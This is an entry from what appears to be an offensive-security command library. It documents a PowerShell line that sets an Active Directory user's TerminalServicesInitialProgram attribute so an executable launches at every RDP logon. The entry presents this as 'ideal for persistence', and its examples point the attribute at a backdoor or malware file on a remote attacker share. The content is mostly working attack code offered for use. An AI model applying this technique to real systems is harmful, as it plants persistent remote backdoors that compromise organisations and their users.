---
id: e3448a0a-f4b7-4482-8ed1-e700d8e94615
name: Set Terminal Services Initial Program
type: command
executor: powershell
data: $UserObject.TerminalServicesInitialProgram = "$_EXECUTABLE_PATH"
output: null
created_at: '2023-04-06T03:56:06.779400+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - active-directory
  - rds
  - persistence
verified: true
validated: true
---

# Set Terminal Services Initial Program

## Command

```powershell
$UserObject.TerminalServicesInitialProgram = "$_EXECUTABLE_PATH"
```

## Description

This command modifies the TerminalServicesInitialProgram attribute of an Active Directory user object to specify an executable that runs automatically upon RDP logon. It requires a prior bound $UserObject from ADSI and GenericWrite permissions. Ideal for persistence in RDS environments.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_EXECUTABLE_PATH | UNC or local path to the executable, e.g., \\attacker-ip\share\malware.exe | Yes |

## Examples

### Basic Usage

```powershell
$UserObject.TerminalServicesInitialProgram = "\\192.168.1.100\share\backdoor.exe"
```

### Advanced Usage

With validation:

```powershell
$UserObject.TerminalServicesInitialProgram = "$_EXECUTABLE_PATH"
if ($UserObject.TerminalServicesInitialProgram -eq "$_EXECUTABLE_PATH") { Write-Output "Attribute set successfully" }
```

## Expected Output

No output on success. The attribute is updated in memory on the $UserObject but not persisted until SetInfo() is called. Verify with `$UserObject.TerminalServicesInitialProgram`. Errors occur if $UserObject is null or permissions are insufficient.

## Related

- [[Abuse AD ACLs GenericWrite to Configure RCM Persistence]]
- [[Retrieve ADSI User Object]]
